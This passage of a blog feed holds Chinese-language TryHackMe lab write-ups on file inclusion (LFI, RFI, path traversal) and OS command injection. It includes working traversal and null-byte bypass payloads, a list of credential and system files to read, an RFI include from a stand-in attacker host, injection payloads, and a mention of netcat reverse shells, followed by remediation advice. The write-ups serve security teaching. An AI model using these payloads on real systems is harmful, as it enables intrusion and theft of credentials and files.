aria-hidden="true">image-20221021211650450</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>File inclusion(文件包含)</title>
    <link href="/2023/06/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2023/06/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<p>TryHackMe实验房间：https://tryhackme.com/room/fileinc</p><p>本文参考：https://www.cnblogs.com/Hekeats-L/p/16904866.html</p><h2 id="introduction">Introduction</h2><h3 id="what-is-file-inclusion">What is File inclusion</h3><p>文件包含漏洞包括本地文件包含(Local FileInclusion，LFI)，远程文件包含(Remote FileInclusion，RFI)和目录遍历(directory traversal)。</p><p>在某些场景中，编写web应用程序是为了用户能够通过参数请求访问给定系统的文件，包括图像、静态文本等。参数是附加到URL 上的查询参数字符串，可用于用户输入检索数据或执行操作。下图展示了 URL的基本组成部分。（注：<code>?</code>不属于 query string 的一部分）</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230101142447372.png" alt="image-20230101142447372"><figcaption aria-hidden="true">image-20230101142447372</figcaption></figure><p>下面讨论一个例子，用户请求访问web服务器的文件。首先用户将HTTP请求发送到对应的web服务器以显示请求中包含的文件，假设用户想要访问并在页面显示文件内容，请求可能如下：<code>http://webapp.thm/get.php?file=userCV.pdf</code>，其中<code>file</code>是参数，<code>userCV.pdf</code>是用户请求访问的文件名。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230101150112981.png" alt="image-20230101150112981"><figcaption aria-hidden="true">image-20230101150112981</figcaption></figure><h3 id="why-do-file-inclusion-vulnerabilities-happen">Why do Fileinclusion vulnerabilities happen？</h3><p>文件包含漏洞通常在web应用程序的各种编程语言中被发现和利用，例如编写以及实现得较差的<strong>PHP</strong> 程序。这些漏洞的主要问题在于输入验证(inputvalidation)，用户的输入未经排查或验证从而使得用户控制它们。</p><h3 id="what-is-the-risk-of-file-inclusion">What is the risk of Fileinclusion？</h3><p>文件包含的风险取决于攻击者是否可以利用文件包含漏洞读取敏感数据。成功的攻击会导致敏感数据的泄露，包括web应用程序的代码和文件，以及后端系统的凭证。此外，如果攻击者能够以某种方式对服务器的文件进行写入，例如<code>/tmp</code>目录，那么就有可能导致远程命令执行（RCE）漏洞。然而，当文件包含漏洞无法获取敏感数据并且无法对服务器进行写入时，该漏洞就不会有效。</p><h2 id="path-traversal路径遍历">Path Traversal（路径遍历）</h2><p>也称为 <strong>Directorytraversal</strong>（目录遍历），该漏洞允许攻击者读取操作系统资源，例如运行应用程序的服务器上的本地文件。攻击者通过操纵和滥用web应用程序的URL来定位和访问存储在应用程序之外的文件或目录，从而实现对该漏洞的利用。</p><p>当用户的输入传递给PHP中的<code>file_get_contents</code>等函数时，会出现路径遍历漏洞。需要注意的是，函数并不是导致漏洞的主要因素。通常，输入验证或过滤不佳才是导致该漏洞的原因。在PHP中，您可以使用<code>file_get_contents</code>读取文件的内容。在<a href="https://www.php.net/manual/en/function.file-get-contents.php">这里</a>可以查看有关该函数的更多信息。</p><p>下面的图片展示了web应用程序如何存储文件及其文件结构。用户可通过路径<code>/var/www/app/CVs</code>请求访问<code>userCV.pdf</code>文件的内容。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230101155922722.png" alt="image-20230101155922722"><figcaption aria-hidden="true">image-20230101155922722</figcaption></figure><p>我们可以通过添加 <strong>payload</strong>来查看web应用程序的行为用以测试URL参数。路径遍历攻击也称为<code>dot-dot-slash</code>攻击(<strong>../</strong>)，该攻击利用<code>../</code>将目录移动到<strong>上一级</strong>。如果攻击者找到了攻击点，在上图中是<code>get.php?file=</code>，<code>get.php</code>的路径为<code>/var/www/app/get.php</code>，然后攻击者可能发送如下内容：<code>http://webapp.thm/get.php?file=../../../../etc/passwd</code>，通过<code>../</code>不断返回上一级直到根目录，再进入根目录下的<code>/etc</code>目录，找到<code>passwd</code>文件。因此web应用程序最终返回<code>passwd</code>的文件内容。</p><p>同样，如果web应用程序在Windows服务器上运行，攻击者需要提供Windows路径。例如，如果攻击者想要读取<code>c:\boot.ini</code>中的<code>boot.ini</code>文件，那么攻击者可以根据目标Windows系统版本尝试以下操作：</p><blockquote><p>http://webapp.thm/get.php?file=../../../../boot.ini</p><p>或</p><p>http://webapp.thm/get.php?file=../../../../windows/win.ini</p></blockquote><p>下面是测试时的一些常见的操作系统文件：</p><table><colgroup><col style="width: 31%"><col style="width: 68%"></colgroup><thead><tr class="header"><th style="text-align: center;"><strong>Location</strong></th><th style="text-align: center;"><strong>Description</strong></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">/etc/issue</td><td style="text-align: center;">contains a message or systemidentification to be printed before the login prompt.</td></tr><tr class="even"><td style="text-align: center;">/etc/profile</td><td style="text-align: center;">controls system-wide default variables,such as Export variables, File creation mask (umask), Terminal types,Mail messages to indicate when new mail has arrived</td></tr><tr class="odd"><td style="text-align: center;">/proc/version</td><td style="text-align: center;">specifies the version of the Linuxkernel</td></tr><tr class="even"><td style="text-align: center;">/etc/passwd</td><td style="text-align: center;">has all registered user that has accessto a system</td></tr><tr class="odd"><td style="text-align: center;">/etc/shadow</td><td style="text-align: center;">contains information about the system'susers' passwords</td></tr><tr class="even"><td style="text-align: center;">/root/.bash_history</td><td style="text-align: center;">contains the history commands for rootuser</td></tr><tr class="odd"><td style="text-align: center;">/var/log/dmessage</td><td style="text-align: center;">contains global system messages,including the messages that are logged during system startup</td></tr><tr class="even"><td style="text-align: center;">/var/mail/root</td><td style="text-align: center;">all emails for root user</td></tr><tr class="odd"><td style="text-align: center;">/root/.ssh/id_rsa</td><td style="text-align: center;">Private SSH keys for a root or any knownvalid user on the server</td></tr><tr class="even"><td style="text-align: center;">/var/log/apache2/access.log</td><td style="text-align: center;">the accessed requests for Apachewebserver</td></tr><tr class="odd"><td style="text-align: center;">C:.ini</td><td style="text-align: center;">contains the boot options for computerswith BIOS firmware</td></tr></tbody></table><h2 id="local-file-inclusionlfi">Local File Inclusion（LFI）</h2><p>针对 Web 应用程序的 LFI 攻击通常是由于开发人员缺乏安全意识。在使用PHP 时，使用 <code>include</code>、 <code>request</code>、<code>include _ once</code> 和 <code>request _ once</code>等函数常常会导致 Web应用程序易受攻击。在使用其他语言（如ASP、JSP，甚至Node.js）时也会出现LFI漏洞。LFI漏洞利用遵循与路径遍历相同的概念。</p><p>接下来将介绍不同的LFI场景。</p><ol type="1"><li><p>假设web应用程序提供两种语言，用户可以在<code>EN</code>和<code>AR</code>之间进行选择。</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">"lang"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>上面的PHP代码通过URL参数 <code>lang</code> 使用 <code>GET</code>请求来包含页面的文件。可以发送以下HTTP请求来完成调用：<code>http://webapp.thm/index.php?lang=EN.php</code>加载英文页面或<code>http://webapp.thm/index.php?lang=AR.php</code>加载阿拉伯语页面，其中<code>EN.php</code> 和 <code>AR.php</code> 文件位于同一目录中。</p><p>理论上，如果没有任何输入验证，我们可以通过上面的代码访问并显示服务器上的任何可读文件。假设我们想读取<code>/etc/passwd</code>文件，其中包含Linux操作系统用户的敏感信息，我们可以尝试以下操作：<code>http://webapp.thm/get.php?file=/etc/passwd</code></p><p>在这种情况下，它之所以有效，是因为 <code>include</code>函数中没有指定目录，也没有输入验证。</p></li><li><p>第二种情况，开发人员指定了函数中的目录。</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP </span><br><span class="line"><span class="keyword">include</span>(<span class="string">"languages/"</span>. <span class="variable">$_GET</span>[<span class="string">'lang'</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>在上面的代码中，开发人员决定使用<code>include</code>函数通过<code>lang</code> 参数调用 <code>language</code>目录中的PHP页面。如果没有输入验证，攻击者可以通过将 <code>lang</code>输入替换为其他OS敏感文件（如<code>/etc/passwd</code>）来操纵URL。此时，payload看起来类似于<strong>路径遍历</strong>，但 <code>include</code>函数允许我们将任何调用的文件包含到当前页面中。以下是漏洞利用：</p><p><code>http://webapp.thm/index.php?lang=../../../../etc/passwd</code></p></li></ol><p>下面介绍的是一些绕过<code>include</code>函数过滤的技巧。</p><ol type="1"><li><p>对于上面两种情况，我们检查了web应用程序的代码，所以我们知道如何利用它。而在本例中，我们将进行黑盒测试（无法得知源代码），在这种情况下，<strong>报错信息</strong>对于理解数据是如何在web应用程序中的传递和处理十分重要。</p><p>在这种情况下，假设我们有该切入点：<code>http://webapp.thm/index.php?lang=EN</code>。如果我们输入无效的字段，例如<code>THM</code>，我们将得到如下错误：</p><blockquote><p>Warning: include(languages/THM.php): failed to open stream: No suchfile or directory in /var/www/html/THM-4/index.php on line 12</p></blockquote><p>该报错信息披露了重要信息，通过将<code>THM</code>作为输入，错误信息显示了<code>include</code>函数的相关内容：<code>include(languages/THM.php);</code>。</p><p>仔细查看该目录，我们可以知道该函数包含了<code>languages</code>目录中的文件，并在输入的字符串结尾加上了<code>.php</code>。因此有效输入如下：<code>index.php?lang=EN</code>，其中文件<code>EN</code>在<code>languages</code>目录中，完整文件名为<code>EN.php</code>。此外，报错信息还披露了完整web应用程序目录路径的信息：<code>/var/www/html/THM-4/</code>（即<code>languages</code>目录所在路径）。</p><p>我们可以利用<code>http://webapp.thm/index.php?lang=../../../../../etc/passwd</code>来查看敏感信息，我们需要使用5个 <code>../</code> ，因为我们通过报错信息 已经知道当前路径有四级目录<code>/var/www/html/THM-4</code>然后再加上之前提到的<code>languages</code>目录，所以一共有需要5个<code>../</code>但是仍然得到错误信息：</p><blockquote><p>Warning: include(languages/../../../../../etc/passwd.php): failed toopen stream: No such file or directory in /var/www/html/THM-4/index.phpon line 12</p></blockquote><p>由上面的错误信息可知我们可以访问不同目录中的文件，但是<code>include</code>函数会在文件结尾加上<code>.php</code>，导致无法找到对应的文件。这告诉我们：开发人员指定了传递给<code>include</code>函数的文件类型（php）。为了绕过这种限制，我们可以使用<strong>NULLBYTE</strong>（即<code>%00</code>）。</p><p>使用空字节是一种注入(injection)技术，通过在用户提供的数据添加 URL编码<code>%00</code>或十六进制的<code>0x00</code>，以终止字符串。你可以将其视为试图欺骗Web应用程序无视空字节后发生的任何事情。</p><p>通过在 payload的结尾添加空字节，告诉<code>include</code>函数忽略空字节之后的内容，如下：</p><p><code>include("languages/../../../../../etc/passwd%00").".php");</code>相当于 <code>include("languages/../../../../../etc/passwd");</code></p><p><strong>注意</strong>：<code>%00</code>技巧已修复，不适用于 PHP 5.3.4及更高版本。</p></li><li><p>假设开发者决定过滤关键字以避免泄露敏感信息！正在被过滤的是<code>/etc/passwd</code>文件。此时，有两种可能的方法可以尝试绕过该过滤器：通过使用空字节<code>%00</code>或关键字<code>/.</code>。payload可以是<code>http://webapp.thm/index.php?lang=/etc/passwd/.</code>或<code>http://webapp.thm/index.php?lang=/etc/passwd%00</code>。</p><p>为了更清楚地理解<code>/.</code>的使用原理，我们可以查看以下例子：如果我们在文件系统中使用<code>cd ..</code>，我们将切换到上一级目录；如果我们使用的是<code>cd .</code>，我们将停留在当前目录。</p><p>因此，当我们输入<code>/etc/passwd/..</code>时，我们将切换目录到<code>/etc/</code>，然后当我们输入<code>/etc/passwd/.</code>时，将停留在当前目录<code>/etc/passwd</code>，因为<code>.</code>指代的就是当前工作目录。</p></li><li><p>假设开发人员通过过滤一些关键字来验证用户输入。假设我们输入的payload是：<code>http://webapp.thm/index.php?lang=../../../../etc/passwd</code></p><p>得到的错误信息如下：</p><blockquote><p>Warning: include(languages/etc/passwd): failed to open stream: Nosuch file or directory in /var/www/html/THM-5/index.php on line 15</p></blockquote><p>由错误信息中的<code>include(languages/etc/passwd)</code>可知web应用程序将<code>../</code>过滤掉了，通过以下方式可以绕过验证：<code>....//....//....//....//....//etc/passwd</code>。</p><p>绕过原理：PHP过滤器只匹配并消除它找到的第一个子集字符串<code>../</code>，然后不再过滤，如下图所示：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102094746337.png" alt="image-20230102094746337"><figcaption aria-hidden="true">image-20230102094746337</figcaption></figure></li><li><p>假设开发人员强制<code>include</code>函数从指定的目录读取文件。例如，web应用程序要求用户的输入必须包含指定的目录：<code>http://webapp.thm/index.php?lang=languages/EN.php</code>，因此payload应该包含指定目录：<code>?lang=languages/../../../../../etc/passwd</code>。</p></li></ol><h2 id="remote-file-inclusionrfi">Remote File Inclusion（RFI）</h2><p>远程文件包含 (RFI)是一种将远程文件包含到易受攻击的web应用程序中的技术。类似于LFI，当发生不正确的验证时，就会导致RFI，攻击者能够将外部的URL 注入 <code>include</code> 函数中。<strong>RFI发生的条件是需要目标服务器启用<code>allow_url_fopen</code>选项，即将该选项设置为<code>on</code>。</strong></p><p>RFI 的风险高于 LFI，因为 RFI漏洞允许攻击者在目标服务器上进行<strong>远程命令执行（RCE）</strong>操作。RFI导致的其他后果：</p><ul><li>敏感数据泄露</li><li>Cross-site Scripting（XSS）</li><li>Denial of Service（DoS）</li></ul><p>外部服务器必须与目标web应用程序服务器进行通信，以成功实现RFI攻击，攻击者在他们自己的服务器(外部服务器)上托管恶意文件。然后，恶意文件通过HTTP请求注入到目标服务器的<code>include</code>函数中，使得恶意文件的内容在目标应用程序服务器上执行。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102101719466.png" alt="image-20230102101719466"><figcaption aria-hidden="true">image-20230102101719466</figcaption></figure><p>如上图所示，攻击者在自己的服务器上托管了一个 PHP文件：<code>http://attacker.thm/cmd.txt</code>。其中<code>cmd.txt</code>的内容如下：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP <span class="keyword">echo</span> <span class="string">"Hello THM"</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>首先，攻击者注入了恶意的URL（指向攻击者服务器）：<code>http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt</code>。如果没有输入验证，那么恶意URL会被传递给<code>include</code>函数。接下来，web应用程序服务器会向攻击者服务器发送<code>GET</code>请求以获取目标文件。于是目标Web应用程序会将远程文件包含到 <code>include</code> 函数中，在页面执行 PHP文件，并将执行结果返回给攻击者。在该例子中，攻击者会在页面看见<code>Hello THM</code>消息。</p><h3 id="实例">实例</h3><p>首先介绍如何快速搭建一个http服务，使用 simpleHTTPserver在几分钟内将您的桌面系统变成本地文件服务器。simpleHTTPserver 是一个python 模块，可用于设置文件服务器或在 LAN中即时提供目录。局域网中的任何人都可以立即访问您系统中的文件夹或文件。对于python3.0及以上版本，运行：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -m http.server [port]</span><br></pre></td></tr></tbody></table></figure><p>下面开始进行实验：</p><p>首先在攻击者服务器上新建一个 <code>cmd.txt</code>文件，内容为：<code>&lt;?PHP echo "Hello THM"; ?&gt;</code>。然后就在当前目录下输入<code>python -m http.server</code>(端口默认为8000)。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102104507593.png" alt="image-20230102104507593"><figcaption aria-hidden="true">image-20230102104507593</figcaption></figure><p>然后在目标网站上输入 payload，实现 RFI 攻击。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102104721781.png" alt="image-20230102104721781"><figcaption aria-hidden="true">image-20230102104721781</figcaption></figure><p>同时攻击者服务器会记录目标服务器的请求：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102104911230.png" alt="image-20230102104911230"><figcaption aria-hidden="true">image-20230102104911230</figcaption></figure><h2 id="remediation补救措施">Remediation(补救措施)</h2><p>作为开发人员，了解 Web应用程序漏洞、掌握漏洞的发现方法以及预防方法非常重要。为了防止文件包含漏洞被攻击者利用，一些常见的建议如下：</p><ul><li>将系统和服务（包括 Web 应用程序框架）更新为最新版本。</li><li>关闭 PHP 报错以避免泄露应用程序的路径和其他可能泄露的信息。</li><li>Web 应用程序防火墙 (WAF) 是帮助减轻 Web应用程序攻击的不错选择。</li><li>禁用一些会导致文件包含漏洞的 PHP 功能，例如<code>allow_url_fopen</code> （<code>on</code> 选项）和<code>allow_url_include</code>。</li><li>仔细分析 Web 应用程序，只允许需要的协议和 PHP 包装器。</li><li>永远不要相信用户的输入，并确保针对文件包含实施适当的输入验证处理。</li><li>对文件名和文件位置实施白名单以及黑名单策略。</li></ul><h2 id="challenge">Challenge</h2><h3 id="flag1">flag1</h3><p>打开对应的lab，发现本题需要使用<code>POST</code>传参：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102140838373.png" alt="image-20230102140838373"><figcaption aria-hidden="true">image-20230102140838373</figcaption></figure><p>打开 hackbar ，使用post传参得到flag：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102141011199.png" alt="image-20230102141011199"><figcaption aria-hidden="true">image-20230102141011199</figcaption></figure><h3 id="flag2">flag2</h3><p>打开chall2，显示以下页面：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102141342252.png" alt="image-20230102141342252"><figcaption aria-hidden="true">image-20230102141342252</figcaption></figure><p>根据提示，这题跟<code>cookie</code>有关，F12打开开发者工具，在<code>存储</code>中找到 cookie</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102141551880.png" alt="image-20230102141551880"><figcaption aria-hidden="true">image-20230102141551880</figcaption></figure><p>将值改为<code>admin</code>，刷新页面，发现绿色框中会显示对应的文件内容：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102141739830.png" alt="image-20230102141739830"><figcaption aria-hidden="true">image-20230102141739830</figcaption></figure><p>于是直接将 cookie 的值改为<code>/etc/flag2</code>，得到下图：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102141854365.png" alt="image-20230102141854365"><figcaption aria-hidden="true">image-20230102141854365</figcaption></figure><p>由上图可知，当前所在路径为<code>includes</code>，并且在文件结尾加上了<code>.php</code>后缀，使用<code>../</code>移动到对应目录，然后用<code>%00</code>截断，所有最终构建的payload为：<code>../../../../etc/flag2%00</code>，刷新页面得到flag。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102142239136.png" alt="image-20230102142239136"><figcaption aria-hidden="true">image-20230102142239136</figcaption></figure><h3 id="flag3">flag3</h3><p>直接在给定的框中输入<code>/etc/flag3</code>，得到错误信息：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102142448439.png" alt="image-20230102142448439"><figcaption aria-hidden="true">image-20230102142448439</figcaption></figure><p>由上图发现输入被过滤掉了一些关键字，并且在输入的结尾加上了<code>.php</code>后缀。于是尝试使用<code>POST</code>传参，得到下图：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102142759419.png" alt="image-20230102142759419"><figcaption aria-hidden="true">image-20230102142759419</figcaption></figure><p>可知，<code>%00</code>被识别为了字符串，无法进行截断。使用 Burp Suite进行抓包，得到数据，然后发送到 Repeater 模块</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102143055329.png" alt="image-20230102143055329"><figcaption aria-hidden="true">image-20230102143055329</figcaption></figure><p>直接对数据部分进行修改，将<code>file=%2Fetc%2Fflag3%2500</code>修改为<code>file=%2Fetc%2Fflag3%00</code>，即将URL 编码后的 <code>%2500</code> 修改为原本的 <code>%00</code>，然后发送数据，得到flag</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102143238925.png" alt="image-20230102143238925"><figcaption aria-hidden="true">image-20230102143238925</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>TryHackMe</tag>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令注入</title>
    <link href="/2023/06/10/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/06/10/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>TryHackMe实验房间：https://tryhackme.com/room/oscommandinjection</p><h2 id="introduction">Introduction</h2><p>命令注入(commandinjection)是滥用应用程序的行为在操作系统上执行命令，执行命令时使用与设备上运行应用程序相同的权限。例如，在一个名为joe的用户运行的web服务器上实现命令注入，将在这个joe用户下执行命令——从而获得joe拥有的任何权限。</p><p>命令注入漏洞也被称为 <strong>RCE</strong> (Remote CodeExecution)，因为攻击者可以诱导应用程序执行他们提供的一些 payload，而不需要直接访问机器本身(交互式shell)。Web服务器将处理攻击者传入的代码，并在用户权限和用户可访问的控制权限下执行该代码。</p><p>命令注入之所以又被称为 RCE，是因为它能够在应用程序中远程执行代码，攻击者可以直接与目标系统进行交互。例如，攻击者可能会读取系统或用户文件、数据以及类似的内容。</p><p>一个命令注入的例子：滥用应用程序来执行命令<code>whoami</code>，以列出当前的用户。</p><h2 id="discovering-command-injection">Discovering CommandInjection</h2><p>存在命令注入漏洞是因为应用程序经常使用 PHP 、Python 和 NodeJS等编程语言中的函数来向当前机器的操作系统传递数据 并进行系统调用。</p><p>在下面的代码段中，应用程序获取用户的输入，存储在变量<code>$title</code>中，然后应用程序通过该变量在目录中搜索对应的歌曲标题，下面分为四步分析。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230112171437786.png" alt="image-20230112171437786"><figcaption aria-hidden="true">image-20230112171437786</figcaption></figure><ol type="1"><li>应用程序将 MP3文件存储在操作系统的某个目录中。</li><li><code>$title</code>变量存放用户输入的字符串</li><li><code>$title</code>变量中的数据被传递给命令<code>grep</code>，该命令在文件<em>songtitle.txt</em> 中查找用户希望的内容。</li><li><em>songtitle.txt</em>文件的搜索结果将决定应用程序通知用户相关歌曲是否存在。</li></ol><p>这种信息通常存放在数据库中。这只是应用程序从用户获取输入然后以此与应用程序的操作系统交互的示例。</p><p>攻击者可以让应用程序执行自己注入的命令来滥用此应用程序。他们可以要求该应用程序从敏感的文件中读取数据，而不是使用<code>grep</code>在<em>songtitle.txt</em> 中搜索条目。</p><p>下面是用 Python 编写的代码片段：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230112175932363.png" alt="image-20230112175932363"><figcaption aria-hidden="true">image-20230112175932363</figcaption></figure><ol type="1"><li><code>flask</code>包用于设置web服务器。</li><li>一个使用<code>subprocess</code>包在设备上执行命令的函数。</li><li>我们在web服务器中使用一个路由，它将执行提供的任何代码。例如，要执行<code>whoami</code>，我们需要访问<code>http://flaskapp.thm/whoami</code>。</li></ol><h2 id="exploiting-command-injection">Exploiting Command Injection</h2><p>通常可以通过应用程序的行为来判断是否能够进行命令注入。</p><p>使用用户输入用数据填充系统命令的应用程序通常会出现意外行为。例如，shell运算符 <code>;</code>、<code>&amp;</code> 和 <code>&amp;&amp;</code>将会组合两个或多个系统命令并执行它们。</p><p>命令注入可以通过以下两种方法进行检测：</p><ol type="1"><li>Blind command injection</li><li>Verbose command injection</li></ol><p>下面是对这两种方法的详细介绍：</p><table><colgroup><col style="width: 14%"><col style="width: 85%"></colgroup><thead><tr class="header"><th style="text-align: center;"><strong>Method</strong></th><th style="text-align: center;"><strong>Description</strong></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">Blind</td><td style="text-align: center;">这种类型的注入在测试 payload时没有输出的地方（无回显），你必须调查应用程序的行为以确定 payload是否有效。</td></tr><tr class="even"><td style="text-align: center;">Verbose</td><td style="text-align: center;">这种注入是有回显的。例如，运行<code>whoami</code>命令可以查看应用程序当前的用户。Web应用程序会直接在页面上输出用户名。</td></tr></tbody></table><h3 id="检测-blind-command-injection">检测 Blind Command Injection</h3><p>发生该命令注入时没有可见的输出，因此不会立即显示出来。例如，执行一个命令，但Web 应用程序不输出任何消息。</p><p>对于这种类型的命令注入，我们需要使用能够导致时间延迟的 payload。例如，<code>ping</code>和<code>sleep</code>命令是对测试 payload很重要。以<code>ping</code>为例，根据你指定的 <em>ping</em>次数，该应用程序将挂起 <em>x</em> 秒。</p><p>另一种测试 blind command injection的方法是强制输出。这可以通过使用重定向操作符(例如:<code>&gt;</code>)来完成。例如，我们可以告诉web应用程序执行<code>whoami</code>等命令并将其重定向到一个文件中，然后我们可以使用<code>cat</code>等命令读取文件内容。</p><p><code>curl</code>命令是测试命令注入的好方法，因为我们可以在 payload中使用<code>curl</code>来向应用程序传递数据或者从应用程序中传递数据。以下面的代码为例，该payload 可以向应用程序传递数据。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami</span><br><span class="line">经过url解码后：curl http://vulnerable.app/process.php?search=The Beatles; whoami</span><br></pre></td></tr></tbody></table></figure><h3 id="检测-verbose-command-injection">检测 Verbose CommandInjection</h3><p>这种命令注入是指应用程序向你提供有关正在发生或正在执行的内容的反馈或输出。例如，<code>ping</code>和<code>whoami</code>等命令的输出直接显示在web应用程序上。</p><h3 id="有用的-payload">有用的 payload</h3><p>Linux：</p><table><colgroup><col style="width: 15%"><col style="width: 84%"></colgroup><thead><tr class="header"><th style="text-align: center;"><strong>Payload</strong></th><th style="text-align: center;"><strong>Description</strong></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">whoami</td><td style="text-align: center;">See what user the application is runningunder.</td></tr><tr class="even"><td style="text-align: center;">ls</td><td style="text-align: center;">List the contents of the currentdirectory. You may be able to find files such as configuration files,environment files (tokens and application keys), and many more valuablethings.</td></tr><tr class="odd"><td style="text-align: center;">ping</td><td style="text-align: center;">This command will invoke the applicationto hang. This will be useful in testing an application for <strong>blindcommand injection</strong>.</td></tr><tr class="even"><td style="text-align: center;">sleep</td><td style="text-align: center;">This is another useful payload intesting an application for <strong>blind command injection</strong>,where the machine does not have <code>ping</code> installed.</td></tr><tr class="odd"><td style="text-align: center;">nc</td><td style="text-align: center;">Netcat can be used to spawn a reverseshell onto the vulnerable application. You can use this foothold tonavigate around the target machine for other services, files, orpotential means of escalating privileges.</td></tr></tbody></table><p>Windows：</p><table><colgroup><col style="width: 15%"><col style="width: 84%"></colgroup><thead><tr class="header"><th style="text-align: center;"><strong>Payload</strong></th><th style="text-align: center;"><strong>Description</strong></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">whoami</td><td style="text-align: center;">See what user the application is runningunder.</td></tr><tr class="even"><td style="text-align: center;">dir</td><td style="text-align: center;">List the contents of the currentdirectory. You may be able to find files such as configuration files,environment files (tokens and application keys), and many more valuablethings.</td></tr><tr class="odd"><td style="text-align: center;">ping</td><td style="text-align: center;">This command will invoke the applicationto hang. This will be useful in testing an application for <strong>blindcommand injection</strong>.</td></tr><tr class="even"><td style="text-align: center;">timeout</td><td style="text-align: center;">This command will also invoke theapplication to hang. It is also useful for testing an application for<strong>blind command injection</strong> if the <code>ping</code>command is not installed.</td></tr></tbody></table><h2 id="remediating-command-injection预防命令注入">Remediating CommandInjection（预防命令注入）</h2><h3 id="vulnerable-functions易受攻击的函数"><strong>VulnerableFunctions</strong>（易受攻击的函数）</h3><p>在 PHP 中，许多函数能够通过 shell与操作系统交互并执行命令，例如：</p><ul><li>Exec</li><li>Passthru</li><li>System</li></ul><p>以下面的代码为例，应用程序只接受和处理输入到表单的<strong>数字</strong>，意味着不会处理任何命令。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230112214000991.png" alt="image-20230112214000991"><figcaption aria-hidden="true">image-20230112214000991</figcaption></figure><ol type="1"><li>应用程序只接受特定的字符格式（数字 0 -- 9）。</li><li>应用程序仅执行该格式的数据。</li></ol><p>这些函数接受字符串或用户数据等输入，并执行系统上提供的任何内容。任何未经检查就使用这些函数的应用程序容易受到命令注入攻击。</p><h3 id="input-sanitisation输入检测"><strong>Inputsanitisation</strong>（输入检测）</h3><p>对用户输入进行检测和过滤是防止命令注入的好方法。这是一个指定用户可以提交的数据格式或类型的过程。例如，只接受数字类型的数据或删除任何特殊字符（如<code>&gt;</code>、<code>&amp;</code>和<code>/</code>）的输入字段。</p><p>在下面的代码中，<code>filter_input</code>函数用于检查用户输入的数据是否是数字，若不是数字，则这是一个无效的输入。</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">filter_input</span>(INPUT_GET, <span class="string">"number"</span>, FILTER_VALIDATE_NUMBER)) {</span><br><span 